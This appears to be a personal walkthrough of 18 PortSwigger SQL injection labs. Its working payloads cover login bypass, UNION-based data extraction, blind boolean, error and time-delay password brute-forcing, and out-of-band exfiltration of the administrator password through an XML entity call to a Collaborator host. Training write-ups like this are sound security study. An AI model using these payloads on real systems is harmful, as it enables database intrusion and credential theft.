# PortSwigger Labs

<!-- vscode-markdown-toc -->
* [SQL Injection](#SQLInjection)
	* [Lab 01: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](#Lab01:SQLinjectionvulnerabilityinWHEREclauseallowingretrievalofhiddendata)
	* [Lab 02: SQL injection vulnerability allowing login bypass](#Lab02:SQLinjectionvulnerabilityallowingloginbypass)
	* [Lab 03: SQL injection attack, querying the database type and version on Oracle](#Lab03:SQLinjectionattackqueryingthedatabasetypeandversiononOracle)
	* [Lab 04: SQL injection attack, querying the database type and version on MySQL and Microsoft](#Lab04:SQLinjectionattackqueryingthedatabasetypeandversiononMySQLandMicrosoft)
	* [Lab 05: SQL injection attack, listing the database contents on non-Oracle databases](#Lab05:SQLinjectionattacklistingthedatabasecontentsonnon-Oracledatabases)
	* [Lab 06: SQL injection attack, listing the database contents on Oracle](#Lab06:SQLinjectionattacklistingthedatabasecontentsonOracle)
	* [Lab 07: SQL injection UNION attack, determining the number of columns returned by the query](#Lab07:SQLinjectionUNIONattackdeterminingthenumberofcolumnsreturnedbythequery)
	* [Lab 08: SQL injection UNION attack, finding a column containing text](#Lab08:SQLinjectionUNIONattackfindingacolumncontainingtext)
	* [Lab 09: SQL injection UNION attack, retrieving data from other tables](#Lab09:SQLinjectionUNIONattackretrievingdatafromothertables)
	* [Lab 10: SQL injection UNION attack, retrieving multiple values in a single column](#Lab10:SQLinjectionUNIONattackretrievingmultiplevaluesinasinglecolumn)
	* [Lab 11: Blind SQL injection with conditional responses](#Lab11:BlindSQLinjectionwithconditionalresponses)
	* [Lab 12: Blind SQL injection with conditional errors](#Lab12:BlindSQLinjectionwithconditionalerrors)
	* [Lab 13: Visible error-based SQL injection](#Lab13:Visibleerror-basedSQLinjection)
	* [Lab 14: Blind SQL injection with time delays](#Lab14:BlindSQLinjectionwithtimedelays)
	* [Lab 15: Blind SQL injection with time delays and information retrieval](#Lab15:BlindSQLinjectionwithtimedelaysandinformationretrieval)
	* [Lab 16: Blind SQL injection with out-of-band interaction](#Lab16:BlindSQLinjectionwithout-of-bandinteraction)
	* [Lab 17: Blind SQL injection with out-of-band data exfiltration](#Lab17:BlindSQLinjectionwithout-of-banddataexfiltration)
	* [Lab 18: SQL injection with filter bypass via XML encoding](#Lab18:SQLinjectionwithfilterbypassviaXMLencoding)

<!-- vscode-markdown-toc-config
	numbering=false
	autoSave=true
	/vscode-markdown-toc-config -->
<!-- /vscode-markdown-toc -->

[PortSwigger Cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

[PortSwigger Labs](https://portswigger.net/web-security/all-labs#sql-injection)

---

## <a name='SQLInjection'></a>SQL Injection

### <a name='Lab01:SQLinjectionvulnerabilityinWHEREclauseallowingretrievalofhiddendata'></a>Lab 01: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

Level: Apprentice

![](imgs/2023-09-11-19-55-50.png)

'?category='
![](imgs/2023-09-11-19-57-59.png)

the application carries out a SQL query like the following:

```
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

You can put the clause 'AND released = 1' after a '--' quote (comment syntax). Then the clause 'AND released = 1' no longer available.

Query:

```
?category=Gifts' or 1=1--;'
?category=Gifts%27%20or%201=1--;%27
```

![](imgs/2023-09-11-20-09-36.png)

### <a name='Lab02:SQLinjectionvulnerabilityallowingloginbypass'></a>Lab 02: SQL injection vulnerability allowing login bypass

[Link](https://portswigger.net/web-security/sql-injection/lab-login-bypass)

![](imgs/2023-09-11-20-33-25.png)

Query:

```
Username: administrator'--
Password: random
```

### <a name='Lab03:SQLinjectionattackqueryingthedatabasetypeandversiononOracle'></a>Lab 03: SQL injection attack, querying the database type and version on Oracle

[Link](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)

Query:

```
?category=Gifts' UNION SELECT 'a',banner FROM v$version--
```

![](imgs/2023-09-11-20-50-41.png)

### <a name='Lab04:SQLinjectionattackqueryingthedatabasetypeandversiononMySQLandMicrosoft'></a>Lab 04: SQL injection attack, querying the database type and version on MySQL and Microsoft

[Link](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)

![](imgs/2023-10-09-12-43-13.png)

```
GET /filter?category='+UNION+SELECT+'test1','test2'# HTTP/2
```

![](imgs/2023-10-09-12-48-32.png)

```
GET /filter?category='+UNION+SELECT+@@version,NULL# HTTP/2
```

![](imgs/2023-10-09-12-51-06.png)

![](imgs/2023-10-09-12-57-44.png)

### <a name='Lab05:SQLinjectionattacklistingthedatabasecontentsonnon-Oracledatabases'></a>Lab 05: SQL injection attack, listing the database contents on non-Oracle databases

[Link](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)

```
GET /filter?category='UNION+SELECT+NULL,NULL-- HTTP/2
```

![](imgs/2023-10-09-13-05-18.png)

```
GET /filter?category='UNION+SELECT+'test1','test2'-- HTTP/2
```

![](imgs/2023-10-09-13-06-44.png)

```
GET /filter?category='UNION+SELECT+table_name,NULL+from+information_schema.tables-- HTTP/2
```

![](imgs/2023-10-09-13-09-07.png)

```
GET /filter?category='UNION+SELECT+*+from+users_tmnxqa-- HTTP/2
```

![](imgs/2023-10-09-13-12-50.png)

```
User: Administrator
Password: 0dljnpj83cftlgyx16jq
```

![](imgs/2023-10-09-13-14-04.png)

### <a name='Lab06:SQLinjectionattacklistingthedatabasecontentsonOracle'></a>Lab 06: SQL injection attack, listing the database contents on Oracle

[Link](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)

```
GET /filter?category='UNION+SELECT+'test1','test2'+from+dual-- HTTP/2
```

![](imgs/2023-10-09-13-28-38.png)

```
GET /filter?category='UNION+SELECT+table_name,NULL+FROM+all_tables-- HTTP/2
```

![](imgs/2023-10-09-13-30-49.png)

```
GET /filter?category='UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_IYIJQZ'-- HTTP/2
```

![](imgs/2023-10-09-13-33-36.png)

```
GET /filter?category='UNION+SELECT+PASSWORD_KXIRJS,NULL+FROM+USERS_IYIJQZ+WHERE+USERNAME_WZVTMB='administrator'-- HTTP/2
```

![](imgs/2023-10-09-13-37-26.png)

```
Username: administrator
Password: p6rdwe329a5kgdsu4q5b
```

![](imgs/2023-10-09-13-38-59.png)

### <a name='Lab07:SQLinjectionUNIONattackdeterminingthenumberofcolumnsreturnedbythequery'></a>Lab 07: SQL injection UNION attack, determining the number of columns returned by the query

[Link](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)

```
GET /filter?category='UNION+SELECT+NULL,NULL,NULL-- HTTP/2
```

![](imgs/2023-10-09-13-46-41.png)
-> table has 3 columns

![](imgs/2023-10-09-13-48-34.png)

### <a name='Lab08:SQLinjectionUNIONattackfindingacolumncontainingtext'></a>Lab 08: SQL injection UNION attack, finding a column containing text

[Link](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)

![](imgs/2023-10-09-13-52-49.png)

```
GET /filter?category='UNION+SELECT+NULL,NULL,NULL-- HTTP/2
```

![](imgs/2023-10-09-13-52-07.png)
-> table has 3 columns

```
GET /filter?category='UNION+SELECT+NULL,'ViFdd7',NULL-- HTTP/2
```

![](imgs/2023-10-09-13-53-37.png)

### <a name='Lab09:SQLinjectionUNIONattackretrievingdatafromothertables'></a>Lab 09: SQL injection UNION attack, retrieving data from other tables

[Link](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)

```
GET /filter?category='UNION+SELECT+username,password+from+users+WHERE+username='administrator'-- HTTP/2
```

![](imgs/2023-10-09-19-17-47.png)

### <a name='Lab10:SQLinjectionUNIONattackretrievingmultiplevaluesinasinglecolumn'></a>Lab 10: SQL injection UNION attack, retrieving multiple values in a single column

[Link](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)

```
GET /filter?category='UNION+SELECT+NULL,'test2'-- HTTP/2
```

![](imgs/2023-10-09-19-30-58.png)

```
GET /filter?category='UNION+SELECT+NULL,password+from+users+WHERE+username='administrator'-- HTTP/2
```

![](imgs/2023-10-09-19-32-08.png)

```
Username: administrator
Password: at83g32icqx71z7sboa0
```

![](imgs/2023-10-09-19-33-29.png)

### <a name='Lab11:BlindSQLinjectionwithconditionalresponses'></a>Lab 11: Blind SQL injection with conditional responses

[Link](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)

![](imgs/image-2.png)
-> TrackingId: v0gRhsIwxZaVQJ5y

```
GET /filter?category='Pets-- HTTP/2
Host: 0a3f004804f1839b811ed70f008900d7.web-security-academy.net
Cookie: TrackingId=v0gRhsIwxZaVQJ5y; session=HpO6JP8rKpnyc9ehjYBb9cSkohAAgT13
```

![](imgs/2023-10-09-20-07-23.png)

-> 'Welcome back' message appears when the query return null/false.
-> Brute force the information by blind SQL injection in the Cookie.TrackingId field.

Try to guest the length of the password

```
TrackingId=v0gRhsIwxZaVQJ5y'+AND+(SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+LENGTH(password)>1)='a'--
```

![](imgs/2023-10-09-20-22-20.png)

If the length is true, the 'Welcome back' message will be disappeared.
![](imgs/2023-10-09-20-23-45.png)
-> The password length is 20.

```
TrackingId=v0gRhsIwxZaVQJ5y'+AND+SUBSTRING((SELECT+password+FROM+users+WHERE+username='administrator'),§1§,1)='§a§'--
```

![](imgs/2023-10-09-20-37-06.png)

Payload settings:

![](imgs/2023-10-09-20-37-49.png)
![](imgs/2023-10-09-20-43-32.png)

Attacking...
![](imgs/2023-10-09-21-01-40.png)

```
Username: administrator
Password: qd7g73kl51rhmvdb63xv
```

![](imgs/2023-10-09-21-52-08.png)

### <a name='Lab12:BlindSQLinjectionwithconditionalerrors'></a>Lab 12: Blind SQL injection with conditional errors

[Link](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)

```
TrackingId=<Your TrackingId>'
```

![](imgs/2023-10-09-21-59-23.png)
-> Internal Error

```
TrackingId=<Your TrackingId>'||'
```

![](imgs/2023-10-09-22-00-40.png)
-> No more Internal Error

```
TrackingId=<Your TrackingId>'||(SELECT+''+FROM+dual)||'
```

-> No Internal Error -> Oracle Server

![](imgs/2023-10-09-22-42-57.png)

```
TrackingId=<Your TrackingId>'||(SELECT+CASE+WHEN+(1=2)+THEN+to_char(1/0)+ELSE+NULL+END+FROM+dual)||'
```

-> No Internal Error

Brute force the password length

```
TrackingId=<Your TrackingId>'||(SELECT+CASE+WHEN+(LENGTH(password)=1)+THEN+to_char(1/0)+ELSE+NULL+END+FROM+users+WHERE+username='administrator')||'
```

If the length is true, the response will contain the SQL error

![](imgs/2023-10-09-22-49-19.png)
-> The length of the password is 20

Brute force the password

```
TrackingId=<Your TrackingId>'||(SELECT+CASE+WHEN+(SUBSTR(password,§1§,1)='§a§')+THEN+to_char(1/0)+ELSE+NULL+END+FROM+users+WHERE+username='administrator')||'
```

Payload settings:

![](imgs/2023-10-09-22-54-13.png)
![](imgs/2023-10-09-22-54-54.png)

Attacking:

![](imgs/2023-10-09-23-03-08.png)

```
Username: administrator
Password: zw2nvf9u3eeztllnsih5
```

![](imgs/2023-10-09-23-41-35.png)

### <a name='Lab13:Visibleerror-basedSQLinjection'></a>Lab 13: Visible error-based SQL injection

[Link](https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based)

```
TrackingId=<Your TrackingId>'+AND+1=CAST((SELECT 1) AS int)--
```

![](imgs/2023-10-09-23-50-48.png)
-> No verbose error

```
TrackingId=<Your TrackingId>'+AND 1=CAST((SELECT * from users) AS int)--
```

![](imgs/2023-10-10-00-01-34.png)
-> ERROR: subquery must return only one column

```
TrackingId=' AND 1=CAST((SELECT password from users LIMIT 1) AS int)--
```

**You need to remove your tracking id to free up some characters that your query can then use**

![](imgs/2023-10-10-00-08-42.png)

```
Username: administrator
Password: r2tlshhvr6m1cqmllrt3
```

![](imgs/2023-10-10-00-09-32.png)

### <a name='Lab14:BlindSQLinjectionwithtimedelays'></a>Lab 14: Blind SQL injection with time delays

[Link](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays)

Time delays cheat sheet:
![](imgs/2023-10-10-00-14-00.png)

```
TrackingId=<Your TrackingId>'||pg_sleep(10)--
```

![](imgs/2023-10-10-00-15-18.png)

### <a name='Lab15:BlindSQLinjectionwithtimedelaysandinformationretrieval'></a>Lab 15: Blind SQL injection with time delays and information retrieval

[Link](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)

```
TrackingId=<Your TrackingId>'||pg_sleep(10)--
```

-> PostgreSQL

```
TrackingId=<Your TrackingId>'||CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```

If your condition is true, the website will be delayed for 10 seconds.

Brute force to find the password length

```
TrackingId=<Your TrackingId>'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)=$1$)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

![](imgs/2023-10-10-00-32-29.png)
-> The password length is 20

Brute force the password

```
TrackingId=<Your TrackingId>'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,§1§,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

![](imgs/2023-10-10-00-37-05.png)

```
Username: Administrator
Password: 3ewy9yfdfg7vfqjlv1oy
```

![](imgs/2023-10-10-00-44-33.png)

### <a name='Lab16:BlindSQLinjectionwithout-of-bandinteraction'></a>Lab 16: Blind SQL injection with out-of-band interaction

[Link](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band)

```
TrackingId=<Your TrackingId>'||(SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//<Your BurpSuite Collaborator Server>/">+%25remote%3B]>'),'/l')+FROM+dual)--
```

![](imgs/2023-10-10-10-24-26.png)

Open tab Collaborator (Pro only):
![](imgs/2023-10-10-10-24-56.png)

![](imgs/2023-10-10-10-25-58.png)

### <a name='Lab17:BlindSQLinjectionwithout-of-banddataexfiltration'></a>Lab 17: Blind SQL injection with out-of-band data exfiltration

[Link](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration)

```
TrackingId=<Your TrackingId>'||(SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.<Your BurpSuite Collaborator Server>/">+%25remote%3B]>'),'/l')+FROM+dual)--
```

![](imgs/2023-10-10-10-59-25.png)

```
Username: administrator
Password: uk7az7u3limbj95dg50b
```

![](imgs/2023-10-10-11-00-16.png)

### <a name='Lab18:SQLinjectionwithfilterbypassviaXMLencoding'></a>Lab 18: SQL injection with filter bypass via XML encoding

[Link](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)

When click Check Stock button, there is a POST request to the server:
![](imgs/2023-10-10-13-45-01.png)

![](imgs/2023-10-10-13-46-17.png)

The POST data contains the following xml scripts:
```
<?xml version="1.0" encoding="UTF-8"?>
	<stockCheck>
		<productId>
			2
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```


Inject SQL query into the script:
```
<?xml version="1.0" encoding="UTF-8"?>
	<stockCheck>
		<productId>
			2
		</productId>
		<storeId>
			<@dec_entities>
				1 UNION SELECT password || ' ' || username FROM users
			<@/dec_entities>
		</storeId>
	</stockCheck>
```
![](imgs/2023-10-10-13-55-25.png)

```
Username: administrator
Password: yr54lyv55oketicmz129
```

![](imgs/2023-10-10-13-56-10.png)
